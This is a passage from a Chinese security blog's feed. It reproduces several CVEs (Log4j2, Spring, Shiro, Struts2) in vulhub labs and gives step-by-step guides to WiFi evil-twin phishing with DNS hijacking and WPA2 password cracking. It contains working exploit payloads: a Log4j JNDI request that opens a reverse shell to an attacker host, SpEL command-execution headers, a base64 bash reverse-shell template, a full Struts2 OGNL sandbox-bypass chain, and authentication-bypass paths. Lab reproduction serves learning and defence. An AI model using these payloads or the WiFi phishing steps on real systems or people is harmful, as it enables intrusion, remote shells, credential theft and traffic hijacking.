+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22947</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22947/1773373437627.png" alt="1773373437627"></p>
+<p>用 burosuite 抓取 http://公网: 8080 数据包</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373497270.png" alt="1773373497270"></p>
+<p>发送 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373535216.png" alt="1773373535216"></p>
+<p>修改请求方法为 POST，路径修改为/actuator/gateway/routes/自定义名称，内容类型改为 Content-Type: appliaction/json，请求主体注入有害 payload</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373619156.png" alt="1773373619156"></p>
+<p>返回 201</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373650371.png" alt="1773373650371"></p>
+<p>应用刚添加的路由发送以下数据包，触发敏感命令执行，修改路径为/actuator/gateway/refresh，修改内容格式：Content-Type: application/x-www-form-urlencoded，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373682194.png" alt="1773373682194"></p>
+<p>返回 200</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373718780.png" alt="1773373718780"></p>
+<p>修改请求方法为 GET，路径改为/actuator/gateway/routes/自定义名称，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373749244.png" alt="1773373749244"></p>
+<p>返回执行结果</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373777399.png" alt="1773373777399"></p>
+<p>删除添加的路由，修改请求头为 DELETE，发送</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373810115.png" alt="1773373810115"></p>
+<p>发送 200</p>
+<p><img src="/2026/02/04/CVE-2022-22947/1773373835197.png" alt="1773373835197"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shiro 认证绕过漏洞 CVE-2020-1957</title>
+    <url>/2026/02/08/CVE-2020-1957/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Shiro 1.0.0-incubating - 1.5.1</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>Shiro 拦截器采用了路径匹配模式</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录管理后台，信息泄露</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Shiro 的 1.5.2 之前的版本中，WebUtils.getPathWithinApplication() 方法处理 URL 时候会根据分号对路径进行截断，会认为分号后面不属于路径一部分；而 Spring 框架在匹配控制器路由时候，会对 URL 进行标准化处理（例如解析穿越符..），它对分号处理方式不同。二者对请求的解析不一样，攻击者通过特殊构造/;/路径来绕过 Shiro 的过滤</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/shiro/CVE-2020-1957</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2020-1957/1773379459769.png" alt="1773379459769"></p>
+<p>抓取 http://靶机 ip:8080/admin 数据包</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379499778.png" alt="1773379499778"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379535602.png" alt="1773379535602"></p>
+<p>直接发送会返回 302 重定向到登录页面</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379578505.png" alt="1773379578505"></p>
+<p>修改路径/;/admin/</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379613741.png" alt="1773379613741"></p>
+<p>发送后返回 200，说明成功绕过登录验证</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379650630.png" alt="1773379650630"></p>
+<p>后续可以直接访问 http://公网: 8080/;/admin/，可以看到绕过了登录</p>
+<p><img src="/2026/02/08/CVE-2020-1957/1773379674688.png" alt="1773379674688"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Log4j2 远程命令执行漏洞 CVE-2021-44228</title>
+    <url>/2026/02/08/CVE-2021-44228/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Log4j 2.0-beta9 - 2.14.1</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p> JNDI 注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>开启端口 8983 和 5005</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Log4j 支持 JNDI 协议的 Lookup 功能，该功能运行开发者在日志中动态插入系统属性（语法格式为 ${prefix:name}），而通过 JNDI，Java 查询可以连接外部资源，攻击者在这里用到了 LDAP 目录服务。攻击者在 HTTP Header 或 URL 参数中发送构造的 payload：${jndi:ldap://攻击机 ip:1389/Exploit}，后端处理这个请求时候会把这个 payload 信息写入日志，Log4j 解析 payload 时，靶机向攻击机请求 LDAP 资源，攻击机返回恶意代码，靶机执行恶意代码完成命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/log4j/CVE-2021-44228</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2021-44228/1773549482803.png" alt="1773549482803"></p>
+<p>下载工具 JNDIExploit</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/black9/Log4shell_JNDIExploit.git</span><br><span class="line">cd Log4shell_JNDIExploit</span><br><span class="line">#--如果没有unzip，下载命令yum install -y unzip</span><br><span class="line">unzip JNDIExploit.v1.2.zip</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2021-44228/1773549515834.png" alt="1773549515834"></p>
+<p>使用工具</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 攻击机ip</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2021-44228/1773549568397.png" alt="1773549568397"></p>
+<p>开启 nc 监听</p>
+<p><img src="/2026/02/08/CVE-2021-44228/1773549681946.png" alt="1773549681946"></p>
+<p>输入攻击请求，成功则返回 200</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#url编码部分原文为${jndi:ldap://攻击机:1389/Basic/ReverseShell/攻击机/nc监听端口}</span><br><span class="line">curl -i -k "http://靶机ip:8983/solr/admin/cores?test=%24%7Bjndi%3Aldap%3A%2F%2F攻击机ip%3A1389%2FBasic%2FReverseShell%2F攻击机ip%2F监听端口%7D"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2021-44228/1773549714204.png" alt="1773549714204"></p>
+<p>JNDIExploit 窗口有回显</p>
+<p><img src="/2026/02/08/CVE-2021-44228/1773549877981.png" alt="1773549877981"></p>
+<p>反弹 shell 成功连接</p>
+<p><img src="/2026/02/08/CVE-2021-44228/1773549916116.png" alt="1773549916116"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Cloud Function 远程代码执行漏洞 CVE-2022-22963</title>
+    <url>/2026/02/04/CVE-2022-22963/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Cloud Function 3.0.0 - 3.1.6</li>
+<li>Spring Cloud Function 3.2.0 - 3.2.2</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p> SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Function 引入 RoutingFunction 功能，允许开发者根据特定条件动态将请求分发给不同函数执行，框架允许通过 HTTP Header 来指定路由逻辑。当请求到达时，RoutingFunction 会检查是否存在特定 HTTP 请求头：spring.cloud.function.routing-expression，如果存在该 Header，框架会将其值作为 SpEL 表达式处理，攻击者可以构造恶意 payload 注入到 spring.cloud.function.routing-expression 属性值，服务器处理 POST 请求时候，识别到恶意 payload 就会触发解析，执行恶意命令。POST 请求主体不能为空，若为空，Spring 的 MessageConverter 可能不会触发后续参数绑定和路由解析流程</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22963</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773373961506.png" alt="1773373961506"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/uppercase 数据包</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773373999475.png" alt="1773373999475"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374028579.png" alt="1773374028579"></p>
+<p>修改请求类型为 POST，路径改为/functionRouter，将内容类型改为 Content-Type: text/plain，并在内容类型上一行注入恶意代码，创建 /tmp/success，还要在请求主体写入数据，这里填 test</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773374058562.png" alt="1773374058562"></p>
+<p>返回 500</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374098488.png" alt="1773374098488"></p>
+<p>进入容器查看文件夹 tmp，发现 success 文件，说明成功执行敏感命令</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374122900.png" alt="1773374122900"></p>
+<p>下面尝试进行反弹 shell，开启监听，nc -lvvp 7777</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374153226.png" alt="1773374153226"></p>
+<p>将下面命令替换到原 payload 的 touch /tmp/success</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22963/1773374183055.png" alt="1773374183055"></p>
+<p>连接成功，虽然不稳定</p>
+<p><img src="/2026/02/04/CVE-2022-22963/1773374207523.png" alt="1773374207523"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Security 认证绕过漏洞 CVE-2022-22978</title>
+    <url>/2026/02/04/CVE-2022-22978/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Security 5.5.0 - 5.5.6</li>
+<li>Spring Security 5.6.0 - 5.6.3</li>
+<li>以及更早的停止维护版本。</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>Spring Security 默认使用 AntPathRequestMatcher</li>
+<li>正则表达式使用了点号（.）通配符</li>
+<li>未显式设置 caseInsensitive 或 DOTALL 参数</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>越权获取敏感信息</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>RegexRequestMatcher（正则匹配器）初始化未开启 DOTALL 模式（开启后点号匹配范围扩大，可以匹配包括换行符在内的所以字符），安全框架用正则匹配路径，由于. 无法识别 %0a，导致正则引擎判定匹配失败，即认为加入 %0a 不属于受保护的范围，绕过了权限检验，从而能够访问敏感业务信息</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22978</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2022-22978/1773377227416.png" alt="1773377227416"></p>
+<p>用 burpsuite 抓 http://公网: 8080 数据包</p>
+<p><img src="/2026/02/04/CVE-2022-22978/1773377288363.png" alt="1773377288363"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/04/CVE-2022-22978/1773377315682.png" alt="1773377315682"></p>
+<p>修改路径 / admin，访问 admin 页面，返回 404，确认有防护</p>
+<p><img src="/2026/02/04/CVE-2022-22978/1773377352454.png" alt="1773377352454"></p>
+<p>修改路径/admin/%0a，返回 200，成功绕过认证访问受保护资源</p>
+<p><img src="/2026/02/04/CVE-2022-22978/1773377378600.png" alt="1773377378600"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 远程命令执行漏洞 CVE-2021-31805</title>
+    <url>/2026/02/04/CVE-2021-31805/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.0.0 - 2.5.29</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts 内部对象虽然被锁死了，但是 Struts2 运行在 Tomcat 容器，攻击者可以利用 Tomcat 的 InstanceManager 绕过沙箱（相当于 CVE-2021-31805 是对 CVE-2020-17530 修复的绕过），InstanceManager 新建的 org.apache.commons.collections.BeanMap 对象能绕过普通权限检查，直接操作 memberAccess 的私有属性，利用 BeanMap 的 put 方法把 excludedClasses（Struts2 内部的黑名单）改为空，再通过攻击链执行敏感命令。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-061</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2021-31805/1773370476053.png"></p>
+<p>访问 http://公网: 8080，执行 OGNL 表达式 %{(11 + 11).toString()}，下面是对符号 url 编码的 payload，并打开 F12 查看属性，发现属性值出现了 OGNL 表达式计算的结果，说明存在注入点</p>
+<p><img src="/2026/02/04/CVE-2021-31805/1773370569956.png" alt="1773370569956"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#url编码特殊字符</span><br><span class="line">http://公网:8080?id=%25%7b+(11+%2b+11).toString()%7d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注入恶意 payload，可以将 id 替换成其他命令，通过 F12 查看回显</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2021-31805/1773370598158.png" alt="1773370598158"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WIFI 钓鱼</title>
+    <url>/2026/03/16/WiFi-fish/</url>
+    <content><![CDATA[<p>安装 dhcp 服务并创建 leases 文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y isc-dhcp-server</span><br><span class="line">touch /var/lib/dhcp/dhcpd.leases</span><br><span class="line">chmod 777 /var/lib/dhcp/dhcpd.leases</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773486325024.png" alt="1773486325024"></p>
+<p>修改 dhcpd.conf 配置文件</p>
+<p><img src="/2026/03/16/WiFi-fish/1773486758230.png" alt="1773486758230"></p>
+<p>连接无线网卡</p>
+<p><img src="/2026/03/16/WiFi-fish/1773486815899.png" alt="1773486815899"></p>
+<p>关闭网卡</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifoncif wlan0 down</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773486961940.png" alt="1773486961940"></p>
+<p>设置监听模式后开启网卡</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">iwconfig wlan0 mode monitor</span><br><span class="line">ifconfig wlan0 up</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773487079485.png" alt="1773487079485"></p>
+<p>通过 airbase-ng 建立无线热点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airbase-ng -e WIFI名称 -c 信道 wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773487285071.png" alt="1773487285071"></p>
+<p>设置 at0 地址和网关，添加路由，并将虚拟机作为转发机器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig at0 10.0.0.1 net netmask 255.255.255.0</span><br><span class="line">route add -net 10.0.0.0 mask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773626582028.png" alt="1773626582028"></p>
+<p>启动服务后配置规则</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/isc-dhcp-server start</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/25 -j TCPMSS --set-mss 1356</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773627837594.png" alt="1773627837594"></p>
+<p>连接钓鱼的无线网络</p>
+<p><img src="/2026/03/16/WiFi-fish/1773627930611.png" alt="1773627930611"></p>
+<p>进行 DNS 劫持</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#nameserver设置的是其他未被劫持的网站发送给Google的公共DNS服务器8.8.8.8/53查询结果</span><br><span class="line">dnschef --fakedomains-被劫持的网站 --fakeip-10.0.0.1 -i 10.0.0.1 --namesever 8.8.8.8#53</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WiFi-fish/1773628341119.png" alt="1773628341119"></p>
+]]></content>
+      <categories>
+        <category>渗透技术</category>
+      </categories>
+      <tags>
+        <tag>WIFI</tag>
+        <tag>DNS劫持</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WIFI 密码破解</title>
+    <url>/2026/03/16/WIFI-HACK/</url>
+    <content><![CDATA[<p>未连接网卡时候</p>
+<p><img src="/2026/03/16/WIFI-HACK/1773412831699.png" alt="1773412831699"></p>
+<p>接入 USB 无线网卡设备后，虚拟机设置选中连接虚拟机</p>
+<p><img src="/2026/03/16/WIFI-HACK/1773412872695.png" alt="1773412872695"></p>
+<p>可选网络出现当前局域网信息，表明网卡接入成功</p>
+<p><img src="/2026/03/16/WIFI-HACK/1773412906900.png" alt="1773412906900"></p>
+<p>查看新加入的网络名称为 wlan0</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773413147946.png" alt="1773413147946"></p>
+<p>关闭该网卡后查看网卡状态</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#关闭指定网卡</span><br><span class="line">ifconfig wlan0 down</span><br><span class="line">#查看全部网卡状态</span><br><span class="line">ip address</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773413317503.png" alt="1773413317503"></p>
+<p>给无线网卡设置虚假 mac 地址，并开启无线网卡监听模式</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">macchanger --mac 伪造mac地址 wlan0</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773413666703.png" alt="1773413666703"></p>
+<p>查看当前无线设备，并通过该无线网卡搜索周围无线信号</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rfkill list</span><br><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773459364973.png" alt="1773459364973"></p>
+<p>搜集不到信号，重启虚拟机，断开网卡后重新连接</p>
+<p><img src="/2026/03/16/WIFI-HACK/1773459441435.png" alt="1773459441435"></p>
+<p>查看进程并杀掉进程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airmon-ng check</span><br><span class="line">airmon-ng check kill</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773461780462.png" alt="1773461780462"></p>
+<p>重新监听附近 wifi</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/03/16/WIFI-HACK/1773485885291.png" alt="1773485885291"></p>
+<p>监听被破解的 Wifi</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng -c 目标的CH值 -w WPA2-Crack --bssid 目标的mac地址 wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后续有设备连接该 wifi 后，获得 cap 包，后续通过以下命令进行密码爆破，是否爆破成功与字典有关</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">aircrack-ng -b 目标的mac地址 -w 字典位置 获取的cap包</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>渗透技术</category>
+      </categories>
+      <tags>
+        <tag>WIFI</tag>
+        <tag>密码爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Data Commons 远程命令执行 CVE-2018-1273</title>
+    <url>/2026/02/08/CVE-2018-1273/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Data Commons 1.13 - 1.13.10</li>
+<li>Spring Data Commons 2.0 - 2.0.5</li>
+<li>Spring Boot 1.5.0 - 1.5.11</li>
+<li>Spring Boot 2.0.0 - 2.0.1</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring MVC 中，当用户通过 POST 表单提交数据，Spring Data 会尝试将请求参数绑定到后端 Java 对象或 Map 中，Spring Data 允许参数名通过方括号语法定位集合或 Map 中的元素（例如 tags [0] 或 users [‘admin’]），当 Spring Data 处理方括号 2 的参数名时候，会调用 MapDataBinder 进行解析，而系统直接调用 SpEL 引擎来解析方括号内容且不做过滤，攻击者可以通过参数名的方括号注入恶意 SpEL 代码实现命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2018-1273</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372745074.png" alt="1773372745074"></p>
+<p>使用 dirsearch 进行目录扫描</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">dirsearch -u http://公网:8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2018-1273/1773372808616.png" alt="1773372808616"></p>
+<p>访问 http://公网: 8080/users</p>
+<p><img src="/2026/02/08/CVE-2018-1273/1773372834224.png" alt="1773372834224"></p>
+<p>注册账号同时抓包</p>
